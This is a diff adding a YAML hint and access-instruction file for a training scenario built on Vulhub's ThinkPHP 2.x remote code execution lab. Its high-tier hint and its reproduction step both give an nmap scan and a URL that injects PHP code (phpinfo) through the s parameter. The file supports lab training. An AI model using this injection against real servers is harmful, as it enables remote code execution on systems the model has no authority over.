@@ -1,0 +1,53 @@
+# Optional ScenarioForge guide hints; derived from the adjacent public Vulhub documentation.
+schema_version: 1
+match: thinkphp/2-rce
+hint_levels:
+  low:
+  - Inspect the thinkphp service or application on {{NODE_NAME}} @ {{NODE_IP}}.
+  medium:
+  - |-
+    Catalog TCP ports: 8080. Identify the exposed services:
+
+    ```bash
+    nmap -Pn -sT -sV -p 8080 {{NODE_IP}}
+    ```
+  - 'Catalog port mappings (published → container): web: 8080/tcp → container 80/tcp. These are recipe defaults;
+    use the deployed service port if the scenario remaps it.'
+  - 'Documented target URL(s): `http://{{NODE_IP}}:8080/Index/Index`, `http://{{NODE_IP}}:8080/index.php`.'
+  high:
+  - 'Vulnerability: ThinkPHP 2.x Remote Code Execution.'
+  - |-
+    Vulnerability Reproduction
+
+    To exploit this vulnerability, we can inject PHP code through the URL parameters. By visiting `http://{{NODE_IP}}:8080/index.php?s=/index/index/name/${@phpinfo()}`, the `phpinfo()` function will be executed on the target server, demonstrating the successful exploitation of the remote code execution vulnerability:
+
+    Documentation illustration: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/thinkphp/2-rce/1.png
+  - 'Publicly available documentation: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/thinkphp/2-rce/README.md'
+access_instructions:
+  title: ThinkPHP 2.x Remote Code Execution
+  steps:
+  - title: Locate the target service
+    instructions: |-
+      Catalog TCP ports: 8080. Identify the exposed services:
+
+      ```bash
+      nmap -Pn -sT -sV -p 8080 {{NODE_IP}}
+      ```
+
+      Catalog port mappings (published → container): web: 8080/tcp → container 80/tcp. These are recipe defaults; use the deployed service port if the scenario remaps it.
+
+      Documented target URL(s): `http://{{NODE_IP}}:8080/Index/Index`, `http://{{NODE_IP}}:8080/index.php`.
+  - title: Vulnerability Reproduction
+    instructions: |-
+      To exploit this vulnerability, we can inject PHP code through the URL parameters. By visiting `http://{{NODE_IP}}:8080/index.php?s=/index/index/name/${@phpinfo()}`, the `phpinfo()` function will be executed on the target server, demonstrating the successful exploitation of the remote code execution vulnerability:
+
+      Documentation illustration: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/thinkphp/2-rce/1.png
+guidance_source:
+  repository: https://github.com/vulhub/vulhub
+  snapshot_commit: 3af973a39bd0988f288a53fa9ea4b82372774e58
+  documentation_url: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/thinkphp/2-rce/README.md
+  readme_sha256: c7508a6f98b202ec19c947a577f4c3e26038cd4014255ce36e3efa4de508a4aa
+  compose_sha256: 676275d3dd882be2a5704c505922de30d145d6ff8ef109fd768d452af3ab10fb
+  license: MIT; see vulnhub/content/LICENSE
+  method: Tiered discovery hints and adapted reproduction text from the local catalog snapshot. Reproduction commands
+    have not been executed.
